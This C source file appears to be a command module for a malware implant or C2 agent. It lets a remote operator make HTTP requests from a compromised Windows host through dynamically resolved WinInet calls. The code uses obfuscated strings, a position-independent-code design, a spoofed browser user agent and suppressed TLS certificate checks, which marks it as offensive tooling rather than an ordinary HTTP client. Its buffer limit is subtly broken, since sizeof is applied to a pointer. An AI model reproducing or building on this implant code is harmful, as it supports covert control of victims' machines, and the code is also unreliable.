#include "config.h"
#ifdef INCLUDE_CMD_CURL

#include "commands.h"
#include "json_out.h"

VOID cmd_curl(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD url_len = 0, method_len = 0, body_len = 0;
    char* url = parser_string(args, &url_len);
    char* method = parser_string(args, &method_len);
    char* body = parser_string(args, &body_len);
    if (!url || url_len == 0) {
        package_add_string(inst, response, XSTR("Usage: curl <url> [method] [body]"));
        response->is_error = TRUE;
        return;
    }
    const char* verb = "GET";
    if (method && method_len > 0) {
        verb = method;
    }
    BOOL has_body = (body && body_len > 0);

    if (!inst->Win32.InternetOpenA) {
        package_add_string(inst, response, XSTR("WinInet not available"));
        response->is_error = TRUE;
        return;
    }
    HANDLE hSession = inst->Win32.InternetOpenA("Mozilla/5.0", 0, NULL, NULL, 0);
    if (!hSession) {
        package_add_string(inst, response, XSTR("InternetOpen failed"));
        response->is_error = TRUE;
        return;
    }
    // parse URL: [http://]host[:port]/path
    char host[256] = {0};
    char path[512] = "/";
    DWORD port = 80;
    BOOL use_ssl = FALSE;
    const char* p = url;
    if (url[0] && (url[0]|0x20) == 'h') {
        // skip https:// or http://
        while (*p && *p != '/' && *p != ':') p++;
        if (*p == ':') { p += 3; use_ssl = TRUE; port = 443; }
    }
    int hp = 0;
    for (; *p && *p != '/' && hp < 255; p++) host[hp++] = *p;
    if (*p == '/') {
        int pp = 0;
        for (; *p && pp < 511; p++) path[pp++] = *p;
        path[pp] = 0;
    }
    // check for :port
    char* colon = host;
    while (*colon && *colon != ':') colon++;
    if (*colon == ':') { *colon = 0; port = 0; colon++;
        for (; *colon >= '0' && *colon <= '9'; colon++) port = port*10 + (*colon - '0'); }

    HANDLE hConnect = inst->Win32.InternetConnectA(hSession, host, (WORD)port, NULL, NULL, 3, 0, 0);
    if (!hConnect) {
        gate_CloseHandle(inst, hSession);
        package_add_string(inst, response, XSTR("InternetConnect failed"));
        response->is_error = TRUE;
        return;
    }
    DWORD flags = 0x04000000 | 0x00400000; // NO_CACHE_WRITE | KEEP_CONNECTION
    if (use_ssl) flags |= 0x00800000;
    HANDLE hRequest = inst->Win32.HttpOpenRequestA(hConnect, verb, path, NULL, NULL, NULL, flags, 0);
    if (!hRequest) {
        gate_CloseHandle(inst, hConnect);
        gate_CloseHandle(inst, hSession);
        package_add_string(inst, response, XSTR("HttpOpenRequest failed"));
        response->is_error = TRUE;
        return;
    }
    if (use_ssl && inst->Win32.InternetSetOptionA) {
        DWORD sec_flags = 0x00003380;
        inst->Win32.InternetSetOptionA(hRequest, 31, &sec_flags, sizeof(sec_flags));
    }

    BOOL sent = inst->Win32.HttpSendRequestA(hRequest, NULL, 0,
        (void*)body, has_body ? body_len : 0);
    if (!sent) {
        gate_CloseHandle(inst, hRequest);
        gate_CloseHandle(inst, hConnect);
        gate_CloseHandle(inst, hSession);
        package_add_string(inst, response, XSTR("HttpSendRequest failed"));
        response->is_error = TRUE;
        return;
    }

    // status code
    DWORD status_code = 0, sc_size = sizeof(status_code);
    if (inst->Win32.HttpQueryInfoA)
        inst->Win32.HttpQueryInfoA(hRequest, 19 /*HTTP_QUERY_STATUS_CODE|HTTP_QUERY_FLAG_NUMBER*/, &status_code, &sc_size, NULL);

    // read body
    BYTE read_buf[8192];
    DWORD read = 0, total = 0;
    JSON_BUF jb;
    j_init(&jb);
    // we need to read first, then build JSON with the body as a string
    static char* body_buf = NULL;
    // heap-resident: static arrays embed zero-filled in the PIC blob
    if (!body_buf) body_buf = (char*)es_malloc(inst, 65536);
    if (!body_buf) return;
    DWORD body_total = 0;
    while (inst->Win32.InternetReadFile(hRequest, read_buf, sizeof(read_buf), &read) && read > 0 && body_total < sizeof(body_buf) - 1) {
        DWORD to_copy = (body_total + read < sizeof(body_buf) - 1) ? read : (sizeof(body_buf) - 1 - body_total);
        es_memcpy(body_buf + body_total, read_buf, to_copy);
        body_total += to_copy;
    }
    body_buf[body_total] = 0;

    gate_CloseHandle(inst, hRequest);
    gate_CloseHandle(inst, hConnect);
    gate_CloseHandle(inst, hSession);

    j_append_raw(&jb, "{\"status\":");
    j_append_uint(&jb, status_code);
    j_append_raw(&jb, ",\"bytes\":");
    j_append_uint(&jb, body_total);
    j_append_raw(&jb, ",\"body\":");
    j_append_str(&jb, body_buf);
    j_append_raw(&jb, "}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
